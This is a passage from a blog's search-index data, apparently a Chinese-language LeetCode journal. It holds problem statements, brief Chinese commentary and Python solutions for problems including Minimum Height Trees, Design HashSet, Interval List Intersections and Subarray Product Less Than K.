node with label 1 which is the only MHT.Example 2:\nInput: n = 6, edges = [[3,0],[3,1],[3,2],[3,4],[5,4]]Output: [3,4]Example 3:\nInput: n = 1, edges = []Output: [0]Example 4:\nInput: n = 2, edges = [[0,1]]Output: [0,1] Constraints:\n1 \u003c= n \u003c= 2 * 104edges.length == n - 10 \u003c= ai, bi \u003c nai != biAll the pairs (ai, bi) are distinct.The given input is guaranteed to be a tree and there will be no repeated edges. Sol 觀察會發現，其實我們要找的點都在中點上!!\n所以問題就是怎麼找中點\n不像linked list有起點終點，但我們有leaf\n這有點像two pointer，從兩邊去逼近，一直把leaf拿掉，直到剩下兩個以下的node\n要注意的是要用圈為單位，不能用node為單位，不然就會在還有leaf的狀態，因為兩個以下的node而退除loop\nclass Solution: def findMinHeightTrees(self, n: int, edges: List[List[int]]) -\u0026gt; List[int]: if n \u0026lt;= 2: return list(range(n)) else: gh = defaultdict(set) for (a,b) in edges: gh[a].add(b) gh[b].add(a) q = deque([[k for (k,v) in gh.items() if len(v) == 1]]) while len(gh) \u0026gt; 2: rs = q.popleft() leafs = [] for r in rs: for x in gh[r]: # should be only one, but we cant use index on set gh[x].remove(r) if len(gh[x]) == 1: leafs.append(x) del gh[r] q.append(leafs) return list(gh.keys()) ","permalink":"https://littlebees.github.io/2021/08/leetcode-310-minimum-height-trees/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003col\u003e\n\u003cli\u003e第一次看到bfs這麼用\u003c/li\u003e\n\u003cli\u003e這樣叫topo sort嗎?\u003c/li\u003e\n\u003cli\u003e很漂亮的算法，真的很漂亮\u003c/li\u003e\n\u003c/ol\u003e","title":"leetcode-310 - Minimum Height Trees"},{"content":"動機 我就懶\nProblem Design a HashSet without using any built-in hash table libraries.\nImplement MyHashSet class:\nvoid add(key) Inserts the value key into the HashSet.bool contains(key) Returns whether the value key exists in the HashSet or not.void remove(key) Removes the value key in the HashSet. If key does not exist in the HashSet, do nothing. Example 1:\nInput[MyHashSet, add, add, contains, contains, add, contains, remove, contains][[], [1], [2], [1], [3], [2], [2], [2], [2]]Output[null, null, null, true, false, null, true, null, false]ExplanationMyHashSet myHashSet = new MyHashSet();myHashSet.add(1); // set = [1]myHashSet.add(2); // set = [1, 2]myHashSet.contains(1); // return TruemyHashSet.contains(3); // return False, (not found)myHashSet.add(2); // set = [1, 2]myHashSet.contains(2); // return TruemyHashSet.remove(2); // set = [1]myHashSet.contains(2); // return False, (already removed) Constraints:\n0 \u003c= key \u003c= 106At most 104 calls will be made to add, remove, and contains. Sol class MyHashSet: def __init__(self): \u0026#34;\u0026#34;\u0026#34; Initialize your data structure here. \u0026#34;\u0026#34;\u0026#34; self.hash = set() def add(self, key: int) -\u0026gt; None: self.hash.add(key) def remove(self, key: int) -\u0026gt; None: if key in self.hash: self.hash.remove(key) def contains(self, key: int) -\u0026gt; bool: \u0026#34;\u0026#34;\u0026#34; Returns true if this set contains the specified element \u0026#34;\u0026#34;\u0026#34; return key in self.hash ","permalink":"https://littlebees.github.io/2021/08/leetcode-705-design-hashset/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e我就懶\u003c/p\u003e","title":"leetcode-705 - Design HashSet"},{"content":"動機 比起對起點做特別處理，全部列出來再把不合法的濾掉會比較簡單\nProblem You have a long flowerbed in which some of the plots are planted, and some are not. However, flowers cannot be planted in adjacent plots.\nGiven an integer array flowerbed containing 0's and 1's, where 0 means empty and 1 means not empty, and an integer n, return if n new flowers can be planted in the flowerbed without violating the no-adjacent-flowers rule.\nExample 1:\nInput: flowerbed = [1,0,0,0,1], n = 1Output: trueExample 2:\nInput: flowerbed = [1,0,0,0,1], n = 2Output: false Constraints:\n1 \u003c= flowerbed.length \u003c= 2 * 104flowerbed[i] is 0 or 1.There are no two adjacent flowers in flowerbed.0 \u003c= n \u003c= flowerbed.length Sol class Solution: def canPlaceFlowers(self, flowerbed: List[int], n: int, i = 0) -\u0026gt; bool: if n == 0: return True elif i \u0026gt;= len(flowerbed): return False elif any(flowerbed[x] == 1 for x in [x for x in [i-1,i,i+1] if 0 \u0026lt;= x \u0026lt; len(flowerbed)]): return self.canPlaceFlowers(flowerbed,n,i+1) else: flowerbed[i] = 1 return self.canPlaceFlowers(flowerbed,n-1,i+1) ","permalink":"https://littlebees.github.io/2021/08/leetcode-605-can-place-flowers/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e比起對起點做特別處理，全部列出來再把不合法的濾掉會比較簡單\u003c/p\u003e","title":"leetcode-605 - Can Place Flowers"},{"content":"動機 原來這題是greedy阿\nProblem You are given two lists of closed intervals, firstList and secondList, where firstList[i] = [starti, endi] and secondList[j] = [startj, endj]. Each list of intervals is pairwise disjoint and in sorted order.\nReturn the intersection of these two interval lists.\nA closed interval [a, b] (with a \u003c b) denotes the set of real numbers x with a \u003c= x \u003c= b.\nThe intersection of two closed intervals is a set of real numbers that are either empty or represented as a closed interval. For example, the intersection of [1, 3] and [2, 4] is [2, 3].\nExample 1:\nInput: firstList = [[0,2],[5,10],[13,23],[24,25]], secondList = [[1,5],[8,12],[15,24],[25,26]]Output: [[1,2],[5,5],[8,10],[15,23],[24,24],[25,25]]Example 2:\nInput: firstList = [[1,3],[5,9]], secondList = []Output: []Example 3:\nInput: firstList = [], secondList = [[4,8],[10,12]]Output: []Example 4:\nInput: firstList = [[1,7]], secondList = [[3,10]]Output: [[3,7]] Constraints:\n0 \u003c= firstList.length, secondList.length \u003c= 1000firstList.length + secondList.length \u003e= 10 \u003c= starti \u003c endi \u003c= 109endi \u003c starti+10 \u003c= startj \u003c endj \u003c= 109 endj \u003c startj+1 Sol 當成interval merge\nclass Solution: def intervalIntersection(self, f1: List[List[int]], f2: List[List[int]]) -\u0026gt; List[List[int]]: if f1 and f2: if f1[0][0] \u0026gt; f2[0][0]: return self.intervalIntersection(f2,f1) elif f1[0][1] \u0026lt; f2[0][1]: if f1[0][1] \u0026lt; f2[0][0]: return self.intervalIntersection(f1[1:],f2) else: return [[f2[0][0], f1[0][1]]] + self.intervalIntersection(f1[1:],f2) elif f1[0][1] \u0026gt; f2[0][1]: return [f2[0]] + self.intervalIntersection(f1,f2[1:]) else: # == return [[max(f1[0][0],f2[0][0]), f1[0][1]]] + self.intervalIntersection(f1[1:],f2) else: return [] 但其實只要看兩個interval的最高最低，在最高最低的值怪怪的就不管\nclass Solution: def intervalIntersection(self, firstList: List[List[int]], secondList: List[List[int]]) -\u0026gt; List[List[int]]: A = firstList B = secondList ans = [] i = j = 0 while i \u0026lt; len(A) and j \u0026lt; len(B): # Let\u0026#39;s check if A[i] intersects B[j]. # lo - the startpoint of the intersection # hi - the endpoint of the intersection lo = max(A[i][0], B[j][0]) hi = min(A[i][1], B[j][1]) if lo \u0026lt;= hi: ans.append([lo, hi]) # Remove the interval with the smallest endpoint if A[i][1] \u0026lt; B[j][1]: i += 1 else: j += 1 return ans ","permalink":"https://littlebees.github.io/2021/08/leetcode-986-interval-list-intersections/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e原來這題是greedy阿\u003c/p\u003e","title":"leetcode-986 - Interval List Intersections"},{"content":"動機 真的很有趣，利用bit是list，與xor的特性，所以我可以從最高位一位一位建答案\nProblem Given an integer array nums, return the maximum result of nums[i] XOR nums[j], where 0 \u003c= i \u003c= j \u003c n.\nExample 1:\nInput: nums = [3,10,5,25,2,8]Output: 28Explanation: The maximum result is 5 XOR 25 = 28.Example 2:\nInput: nums = [0]Output: 0Example 3:\nInput: nums = [2,4]Output: 6Example 4:\nInput: nums = [8,10,2]Output: 10Example 5:\nInput: nums = [14,70,53,83,49,91,36,80,92,51,66,70]Output: 127 Constraints:\n1 \u003c= nums.length \u003c= 2 * 1050 \u003c= nums[i] \u003c= 231 - 1 Sol 一次一次建ret，所以我們要看的是這個位元能不能設成1\n這樣就是找ret^1 == p^q，之後就能推出ret^1^p == q\nret^1 == p^q (q,p are prefixs) ret^1^p == p^q^p ret^1^p == q 這樣就是從最高位開始看能不加1\nclass Solution: def findMaximumXOR(self, nums: List[int]) -\u0026gt; int: ret = 0 for i in reversed(range(32)): ret \u0026lt;\u0026lt;= 1 # allocate a 0 pres = {n \u0026gt;\u0026gt; i for n in nums} # prefixs from 31~i # set!!!!! if any([ret^1^p in pres for p in pres]): ret = ret^1 return ret ","permalink":"https://littlebees.github.io/2021/08/leetcode-421-maximum-xor-of-two-numbers-in-an-array/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e真的很有趣，利用bit是list，與xor的特性，所以我可以從最高位一位一位建答案\u003c/p\u003e","title":"leetcode-421 - Maximum XOR of Two Numbers in an Array"},{"content":"動機 類似word break去硬幹\nProblem Given an array of strings words representing an English Dictionary, return the longest word in words that can be built one character at a time by other words in words.\nIf there is more than one possible answer, return the longest word with the smallest lexicographical order. If there is no answer, return the empty string.\nExample 1:\nInput: words = [w,wo,wor,worl,world]Output: worldExplanation: The word world can be built one character at a time by w, wo, wor, and worl.Example 2:\nInput: words = [a,banana,app,appl,ap,apply,apple]Output: appleExplanation: Both apply and apple can be built from other words in the dictionary. However, apple is lexicographically smaller than apply. Constraints:\n1 \u003c= words.length \u003c= 10001 \u003c= words[i].length \u003c= 30words[i] consists of lowercase English letters. Sol 不過如果要用bisect在string上就只能sort而已，不能調其他東西\nclass Solution: def longestWord(self, words: List[str]) -\u0026gt; str: words.sort() ret = \u0026#34;\u0026#34; for s in reversed(words): good = True for j in range(len(s)-1): k = bisect_left(words,s[:j+1]) if k \u0026gt;= len(words) or 0 \u0026gt; k or words[k] != s[:j+1]: #print(\u0026#34;fail for\u0026#34;, words[k] if 0\u0026lt;= k \u0026lt; len(words) else None ,s[:j+1]) good = False break ret = s if good and len(s) \u0026gt;= len(ret) else ret return ret ","permalink":"https://littlebees.github.io/2021/08/leetcode-720-longest-word-in-dictionary/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e類似word break去硬幹\u003c/p\u003e","title":"leetcode-720 - Longest Word in Dictionary"},{"content":"動機 用已經建成的next去連，所以遞迴方式變得很有趣\nProblem Given a binary tree\nstruct Node { int val; Node *left; Node *right; Node *next;}Populate each next pointer to point to its next right node. If there is no next right node, the next pointer should be set to NULL.\nInitially, all next pointers are set to NULL.\nFollow up:\nYou may only use constant extra space.Recursive approach is fine, you may assume implicit stack space does not count as extra space for this problem. Example 1:\nInput: root = [1,2,3,4,5,null,7]Output: [1,#,2,3,#,4,5,7,#]Explanation: Given the above binary tree (Figure A), your function should populate each next pointer to point to its next right node, just like in Figure B. The serialized output is in level order as connected by the next pointers, with '#' signifying the end of each level. Constraints:\nThe number of nodes in the given tree is less than 6000.-100 \u003c= node.val \u003c= 100 Sol 剛到這個root就先看左右node能不能連，之後要先遞迴右邊，因為終點在右邊，所以右邊的next要先建好\n之後就是看現在的next能不能建，如果需要另一邊的node就透過next去找\ndef getrightNext(r): if r: if r.left: #print(\u0026#34;left\u0026#34;, r.left.val) return r.left elif r.right: #print(\u0026#34;right\u0026#34;, r.right.val) return r.right else: #print(\u0026#34;next\u0026#34;, r.next.val if r.next else None) return getrightNext(r.next) else: return None class Solution: def connect(self, r: \u0026#39;Node\u0026#39;,p=None) -\u0026gt; \u0026#39;Node\u0026#39;: if r: if r.left and r.right: r.left.next = r.right if not r.next and p: #print(\u0026#34;at\u0026#34;, r.val, p.val) r.next = getrightNext(p.next) self.connect(r.right,r) self.connect(r.left,r) return r ","permalink":"https://littlebees.github.io/2021/08/leetcode-117-populating-next-right-pointers-in-each-node-ii/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e用已經建成的next去連，所以遞迴方式變得很有趣\u003c/p\u003e","title":"leetcode-117 - Populating Next Right Pointers in Each Node II"},{"content":"動機 先看621\nProblem Given a string s, rearrange the characters of s so that any two adjacent characters are not the same.\nReturn any possible rearrangement of s or return if not possible.\nExample 1:\nInput: s = aabOutput: abaExample 2:\nInput: s = aaabOutput: Constraints:\n1 \u003c= s.length \u003c= 500s consists of lowercase English letters. Sol class Solution: def reorganizeString(self, s: str) -\u0026gt; str: cs = Counter(s) ret = [None]*len(s) start = 0 while cs: mostc, most = cs.most_common(1)[0] del cs[mostc] if start \u0026lt; len(s): for i in range(start,start+most*2,2): if i \u0026lt; len(s): ret[i] = mostc if cs: submostc, submost = cs.most_common(1)[0] if submost == 1: del cs[submostc] else: cs[submostc] -= 1 ret[i+1] = submostc start = i+2 #print(start, cs, ret) else: return \u0026#34;\u0026#34; else: return \u0026#34;\u0026#34; return \u0026#39;\u0026#39;.join(ret) 用exception拿掉一些if\nclass Solution: def reorganizeString(self, s: str) -\u0026gt; str: cs = Counter(s) ret = [None]*len(s) start = 0 try: while cs: mostc, most = cs.most_common(1)[0] del cs[mostc] for i in range(start,start+most*2,2): ret[i] = mostc if cs: submostc, submost = cs.most_common(1)[0] if submost == 1: del cs[submostc] else: cs[submostc] -= 1 ret[i+1] = submostc start = i+2 #print(start, cs, ret) return \u0026#39;\u0026#39;.join(ret) except: return \u0026#34;\u0026#34; ","permalink":"https://littlebees.github.io/2021/08/leetcode-767-reorganize-string/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e先看\u003ca href=\"/2021/07/leetcode-621\"\u003e621\u003c/a\u003e\u003c/p\u003e","title":"leetcode-767 - Reorganize String"},{"content":"動機 日常一水題\nProblem We define the usage of capitals in a word to be right when one of the following cases holds:\nAll letters in this word are capitals, like USA.All letters in this word are not capitals, like leetcode.Only the first letter in this word is capital, like Google.Given a string word, return true if the usage of capitals in it is right.\nExample 1:\nInput: word = USAOutput: trueExample 2:\nInput: word = FlaGOutput: false Constraints:\n1 \u003c= word.length \u003c= 100word consists of lowercase and uppercase English letters. Sol class Solution: def detectCapitalUse(self, word: str) -\u0026gt; bool: if word[0].isupper(): return all(c.isupper() for c in word[1:]) or all(c.islower() for c in word[1:]) else: return all(c.islower() for c in word[1:]) ","permalink":"https://littlebees.github.io/2021/08/leetcode-520-detect-capital/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e日常一水題\u003c/p\u003e","title":"leetcode-520 - Detect Capital"},{"content":"動機 sort與heap差在一個能插入，另一個不能\nProblem Given an array of points where points[i] = [xi, yi] represents a point on the X-Y plane and an integer k, return the k closest points to the origin (0, 0).\nThe distance between two points on the X-Y plane is the Euclidean distance (i.e., √(x1 - x2)2 + (y1 - y2)2).\nYou may return the answer in any order. The answer is guaranteed to be unique (except for the order that it is in).\nExample 1:\nInput: points = [[1,3],[-2,2]], k = 1Output: [[-2,2]]Explanation:The distance between (1, 3) and the origin is sqrt(10).The distance between (-2, 2) and the origin is sqrt(8).Since sqrt(8) \u003c sqrt(10), (-2, 2) is closer to the origin.We only want the closest k = 1 points from the origin, so the answer is just [[-2,2]].Example 2:\nInput: points = [[3,3],[5,-1],[-2,4]], k = 2Output: [[3,3],[-2,4]]Explanation: The answer [[-2,4],[3,3]] would also be accepted. Constraints:\n1 \u003c= k \u003c= points.length \u003c= 104-104 \u003c xi, yi \u003c 104 Sol class Solution: def kClosest(self, ps: List[List[int]], k: int) -\u0026gt; List[List[int]]: ps.sort(key=lambda p: p[0]**2+p[1]**2) return ps[:k] ","permalink":"https://littlebees.github.io/2021/08/leetcode-973-k-closest-points-to-origin/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003esort與heap差在一個能插入，另一個不能\u003c/p\u003e","title":"leetcode-973 - K Closest Points to Origin"},{"content":"動機 sliding window的重點是怎麼重用其中一邊的點\nProblem You are visiting a farm that has a single row of fruit trees arranged from left to right. The trees are represented by an integer array fruits where fruits[i] is the type of fruit the ith tree produces.\nYou want to collect as much fruit as possible. However, the owner has some strict rules that you must follow:\nYou only have two baskets, and each basket can only hold a single type of fruit. There is no limit on the amount of fruit each basket can hold.Starting from any tree of your choice, you must pick exactly one fruit from every tree (including the start tree) while moving to the right. The picked fruits must fit in one of your baskets.Once you reach a tree with fruit that cannot fit in your baskets, you must stop.Given the integer array fruits, return the maximum number of fruits you can pick.\nExample 1:\nInput: fruits = [1,2,1]Output: 3Explanation: We can pick from all 3 trees.Example 2:\nInput: fruits = [0,1,2,2]Output: 3Explanation: We can pick from trees [1,2,2].If we had started at the first tree, we would only pick from trees [0,1].Example 3:\nInput: fruits = [1,2,3,2,2]Output: 4Explanation: We can pick from trees [2,3,2,2].If we had started at the first tree, we would only pick from trees [1,2].Example 4:\nInput: fruits = [3,3,3,1,2,1,1,2,3,3,4]Output: 5Explanation: We can pick from trees [1,2,1,1,2]. Constraints:\n1 \u003c= fruits.length \u003c= 1050 \u003c= fruits[i] \u003c fruits.length Sol 通常會是其中一邊慢慢長，這題是起點，另一個點就一直漲一路不回頭\nclass Solution: def totalFruit(self, fs: List[int]) -\u0026gt; int: b, cs, ret = 1, Counter(fs[0:1]), 1 # not 0!! for a in range(len(fs)): while b \u0026lt; len(fs) and len(cs.keys()) \u0026lt;= 2: ret = max(ret,b-a) cs.update([fs[b]]) b += 1 if b \u0026gt;= len(fs): if len(cs.keys()) \u0026lt;= 2: ret = max(ret,b-a) break elif len(cs.keys()) \u0026gt; 2: if cs[fs[a]] == 1: del cs[fs[a]] else: cs.subtract([fs[a]]) return ret ","permalink":"https://littlebees.github.io/2021/08/leetcode-904-fruit-into-baskets/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003esliding window的重點是怎麼重用其中一邊的點\u003c/p\u003e","title":"leetcode-904 - Fruit Into Baskets"},{"content":"動機 bisect的index要處理好 就算是greedy，也要讓程式判斷再去長 你的sliding window不是我的sliding windows Problem Given a sorted integer array arr, two integers k and x, return the k closest integers to x in the array. The result should also be sorted in ascending order.\nAn integer a is closer to x than an integer b if:\n|a - x| \u003c |b - x|, or|a - x| == |b - x| and a \u003c b Example 1:\nInput: arr = [1,2,3,4,5], k = 4, x = 3Output: [1,2,3,4]Example 2:\nInput: arr = [1,2,3,4,5], k = 4, x = -1Output: [1,2,3,4] Constraints:\n1 \u003c= k \u003c= arr.length1 \u003c= arr.length \u003c= 104arr is sorted in ascending order.-104 \u003c= arr[i], x \u003c= 104 Sol 之前想說只要讓他一直先往左長，不夠再去右\n但這樣就出事了，因為不一定保證大於右\nclass Solution: def findClosestElements(self, arr: List[int], k: int, x: int) -\u0026gt; List[int]: i = bisect_left(arr,x) if i == len(arr): # 用bisect一定要處理這個case i -= 1 if i-1 \u0026gt;=0 and arr[i] != x: # 小心負數index i = i-1 if abs(arr[i-1]-x) \u0026lt;= abs(arr[i]-x) else i a,b = i,i+1 while b-a \u0026lt; k: # 讓程式判斷，不要自幹，除非很確定 if 0 \u0026lt;= a and b \u0026lt; len(arr): if abs(arr[a-1]-x) \u0026lt;= abs(arr[b]-x): a -= 1 else: b += 1 elif 0 \u0026lt;= a: a -= 1 else: b += 1 return arr[a:b] ","permalink":"https://littlebees.github.io/2021/08/leetcode-658-find-k-closest-elements/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003col\u003e\n\u003cli\u003ebisect的index要處理好\u003c/li\u003e\n\u003cli\u003e就算是greedy，也要讓程式判斷再去長\u003c/li\u003e\n\u003cli\u003e你的sliding window不是我的sliding windows\u003c/li\u003e\n\u003c/ol\u003e","title":"leetcode-658 - Find K Closest Elements"},{"content":"動機 用for去merge list比用sum([...],[])快，但好多行\nProblem Given two integers n and k, return all possible combinations of k numbers out of the range [1, n].\nYou may return the answer in any order.\nExample 1:\nInput: n = 4, k = 2Output:[ [2,4], [3,4], [2,3], [1,2], [1,3], [1,4],]Example 2:\nInput: n = 1, k = 1Output: [[1]] Constraints:\n1 \u003c= n \u003c= 201 \u003c= k \u003c= n Sol class Solution: def combine(self, n: int, k: int) -\u0026gt; List[List[int]]: def dfs(ss,k,acc=[]): if k == 0: return [acc] else: return sum([dfs(ss[i+1:],k-1,acc+[n]) for (i,n) in enumerate(ss)], []) return dfs(list(range(1,n+1)), k) ","permalink":"https://littlebees.github.io/2021/08/leetcode-77-combinations/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e用for去merge list比用\u003ccode\u003esum([...],[])\u003c/code\u003e快，但好多行\u003c/p\u003e","title":"leetcode-77 - Combinations"},{"content":"動機 原來已經sort過了!!\nProblem Given an integer array nums sorted in non-decreasing order, return an array of the squares of each number sorted in non-decreasing order.\nExample 1:\nInput: nums = [-4,-1,0,3,10]Output: [0,1,9,16,100]Explanation: After squaring, the array becomes [16,1,0,9,100].After sorting, it becomes [0,1,9,16,100].Example 2:\nInput: nums = [-7,-3,2,3,11]Output: [4,9,9,49,121] Constraints:\n1 \u003c= nums.length \u003c= 104-104 \u003c= nums[i] \u003c= 104nums is sorted in non-decreasing order. Follow up: Squaring each element and sorting the new array is very trivial, could you find an O(n) solution using a different approach? Sol 這裡的重點是要從平方後最大的開始塞!!\nclass Solution: def sortedSquares(self, nums: List[int]) -\u0026gt; List[int]: ret = [] i,j = 0,len(nums)-1 while i \u0026lt;= j: if abs(nums[i]) \u0026lt; abs(nums[j]): n = nums[j] j -= 1 else: n = nums[i] i += 1 ret.append(n*n) ret.reverse() return ret ","permalink":"https://littlebees.github.io/2021/08/leetcode-977-squares-of-a-sorted-array/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e原來已經sort過了!!\u003c/p\u003e","title":"leetcode-977 - Squares of a Sorted Array"},{"content":"動機 用bsearch去猜數字\nProblem Let's call an array arr a mountain if the following properties hold:\narr.length \u003e= 3There exists some i with 0 \u003c i \u003c arr.length - 1 such that:arr[0] \u003c arr[1] \u003c ... arr[i-1] \u003c arr[i] arr[i] \u003e arr[i+1] \u003e ... \u003e arr[arr.length - 1]Given an integer array arr that is guaranteed to be a mountain, return any i such that arr[0] \u003c arr[1] \u003c ... arr[i - 1] \u003c arr[i] \u003e arr[i + 1] \u003e ... \u003e arr[arr.length - 1].\nExample 1:\nInput: arr = [0,1,0]Output: 1Example 2:\nInput: arr = [0,2,1,0]Output: 1Example 3:\nInput: arr = [0,10,5,2]Output: 1Example 4:\nInput: arr = [3,4,5,1]Output: 2Example 5:\nInput: arr = [24,69,100,99,79,78,67,36,26,19]Output: 2 Constraints:\n3 \u003c= arr.length \u003c= 1040 \u003c= arr[i] \u003c= 106arr is guaranteed to be a mountain array. Follow up: Finding the O(n) is straightforward, could you find an O(log(n)) solution? Sol class Solution: def peakIndexInMountainArray(self, arr: List[int]) -\u0026gt; int: a,b = 0, len(arr) while a\u0026lt;b: mid = (a+b)//2 if arr[mid-1] \u0026lt; arr[mid] \u0026gt; arr[mid+1]: return mid elif arr[mid-1] \u0026lt; arr[mid] \u0026lt; arr[mid+1]: a = mid+1 elif arr[mid-1] \u0026gt; arr[mid] \u0026gt; arr[mid+1]: b = mid else: raise \u0026#39;this case wont exist\u0026#39; return mid ","permalink":"https://littlebees.github.io/2021/08/leetcode-852-peak-index-in-a-mountain-array/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e用bsearch去猜數字\u003c/p\u003e","title":"leetcode-852 - Peak Index in a Mountain Array"},{"content":"動機 right-left + 1等於以right為最後一個的array到left之間的所有array的組合數\n這題要知道這個魔法才能做\nProblem Given an array of integers nums and an integer k, return the number of contiguous subarrays where the product of all the elements in the subarray is strictly less than k.\nExample 1:\nInput: nums = [10,5,2,6], k = 100Output: 8Explanation: The 8 subarrays that have product less than 100 are:[10], [5], [2], [6], [10, 5], [5, 2], [2, 6], [5, 2, 6]Note that [10, 5, 2] is not included as the product of 100 is not strictly less than k.Example 2:\nInput: nums = [1,2,3], k = 0Output: 0 Constraints:\n1 \u003c= nums.length \u003c= 3 * 1041 \u003c= nums[i] \u003c= 10000 \u003c= k \u003c= 106 Sol left = 0 right = 3 [0,1,2,3] [1,2,3] [2,3] [3] OR [0] [0,1] [0,1,2] [0,1,2,3] right-left+1 = 4 可以用right-left+1算一right為終點的組合數 只要知道這個魔法，就可以只靠index求組合數\n這是從終點做\nclass Solution: def numSubarrayProductLessThanK(self, nums: List[int], k: int) -\u0026gt; int: # right-left + 1 if k \u0026lt;= 1: return 0 else: l, mul, ret = 0, 1, 0 for r in range(len(nums)): mul *= nums[r] while mul \u0026gt;= k: l, mul = l+1, mul // nums[l] ret += (r-l)+1 return ret 從起點做\nclass Solution: def numSubarrayProductLessThanK(self, nums: List[int], k: int) -\u0026gt; int: # right-left + 1 if k \u0026lt;= 1: return 0 else: l,r, mul, ret = 0,1, nums[0], 0 while l \u0026lt; len(nums): while r \u0026lt; len(nums) and nums[r]*mul \u0026lt; k: mul *= nums[r] r += 1 ret += (r-l) mul, l = mul//nums[l], l+1 return ret ","permalink":"https://littlebees.github.io/2021/08/leetcode-713-subarray-product-less-than-k/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e\u003ccode\u003eright-left + 1\u003c/code\u003e等於以right為最後一個的array到left之間的所有array的組合數\u003c/p\u003e\n\u003cp\u003e這題要知道這個魔法才能做\u003c/p\u003e","title":"leetcode-713 - Subarray Product Less Than K"},{"content":"動機 轉成graph錯了嗎\nProblem Given the root of a binary tree, the value of a target node target, and an integer k, return an array of the values of all nodes that have a distance k from the target node.\nYou can return the answer in any order.\nExample 1:\nInput: root = [3,5,1,6,2,0,8,null,null,7,4], target = 5, k = 2Output: [7,4,1]Explanation: The nodes that are a distance 2 from the target node (with value 5) have values 7, 4, and 1.Example 2:\nInput: root = [1], target = 1, k = 3Output: [] Constraints:\nThe number of nodes in the tree is in the range [1, 500].0 \u003c= Node.val \u003c= 500All the values Node.val are unique.target is the value of one of the nodes in the tree.0 \u003c= k \u003c= 1000 Sol 轉成graph，就可以跑dfs了\n而solution上的做法是幫node加parent pointer，這樣就可以往上走了\nclass Solution: def distanceK(self, root: TreeNode, target: TreeNode, k: int) -\u0026gt; List[int]: gh = defaultdict(set) def buildGh(r): if r: dirs = [r.left, r.right] [gh[r.val].add(x.val) or gh[x.val].add(r.val) for x in dirs if x] [buildGh(x) for x in dirs if x] seen = set() ret = [] def dfs(r,k): if r not in seen: seen.add(r) if k == 0: ret.append(r) else: for x in gh[r]: dfs(x,k-1) #seen.remove(r) buildGh(root) dfs(target.val,k) return ret ","permalink":"https://littlebees.github.io/2021/07/leetcode-863-all-nodes-distance-k-in-binary-tree/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e轉成graph錯了嗎\u003c/p\u003e","title":"leetcode-863 - All Nodes Distance K in Binary Tree"},{"content":"動機 就base case特別一點的遞迴，要自己把最後一個加上去\nProblem Given the root of a binary tree and an integer targetSum, return all root-to-leaf paths where each path's sum equals targetSum.\nA leaf is a node with no children.\nExample 1:\nInput: root = [5,4,8,11,null,13,4,7,2,null,null,5,1], targetSum = 22Output: [[5,4,11,2],[5,8,4,5]]Example 2:\nInput: root = [1,2,3], targetSum = 5Output: []Example 3:\nInput: root = [1,2], targetSum = 0Output: [] Constraints:\nThe number of nodes in the tree is in the range [0, 5000].-1000 \u003c= Node.val \u003c= 1000-1000 \u003c= targetSum \u003c= 1000 Sol class Solution: def pathSum(self, root: TreeNode, targetSum: int, acc=[], cnt=0) -\u0026gt; List[List[int]]: if not root: return [] elif not root.left and not root.right: if cnt+root.val == targetSum: return [acc+[root.val]] else: return [] else: return self.pathSum(root.left, targetSum, acc+[root.val], cnt+root.val)+self.pathSum(root.right, targetSum, acc+[root.val], cnt+root.val) ","permalink":"https://littlebees.github.io/2021/07/leetcode-113-path-sum-ii/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e就base case特別一點的遞迴，要自己把最後一個加上去\u003c/p\u003e","title":"leetcode-113 - Path Sum II"},{"content":"動機 這應該是easy吧\nProblem You are given an integer array nums with no duplicates. A maximum binary tree can be built recursively from nums using the following algorithm:\nCreate a root node whose value is the maximum value in nums.Recursively build the left subtree on the subarray prefix to the left of the maximum value.Recursively build the right subtree on the subarray suffix to the right of the maximum value.Return the maximum binary tree built from nums.\nExample 1:\nInput: nums = [3,2,1,6,0,5]Output: [6,3,5,null,2,0,null,null,1]Explanation: The recursive calls are as follow:- The largest value in [3,2,1,6,0,5] is 6. Left prefix is [3,2,1] and right suffix is [0,5]. - The largest value in [3,2,1] is 3. Left prefix is [] and right suffix is [2,1]. - Empty array, so no child. - The largest value in [2,1] is 2. Left prefix is [] and right suffix is [1]. - Empty array, so no child. - Only one element, so child is a node with value 1. - The largest value in [0,5] is 5. Left prefix is [0] and right suffix is []. - Only one element, so child is a node with value 0. - Empty array, so no child.Example 2:\nInput: nums = [3,2,1]Output: [3,null,2,null,1] Constraints:\n1 \u003c= nums.length \u003c= 10000 \u003c= nums[i] \u003c= 1000All integers in nums are unique. Sol class Solution: def constructMaximumBinaryTree(self, nums: List[int]) -\u0026gt; TreeNode: if not nums: return None else: mxi, mxv = max(enumerate(nums), key=itemgetter(1)) ret = TreeNode(mxv) ret.left = self.constructMaximumBinaryTree(nums[:mxi]) ret.right = self.constructMaximumBinaryTree(nums[mxi+1:]) return ret ","permalink":"https://littlebees.github.io/2021/07/leetcode-654-maximum-binary-tree/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e這應該是easy吧\u003c/p\u003e","title":"leetcode-654 - Maximum Binary Tree"},{"content":"動機 3sum的two ptr很重要\nProblem Given an array nums of n integers and an integer target, find three integers in nums such 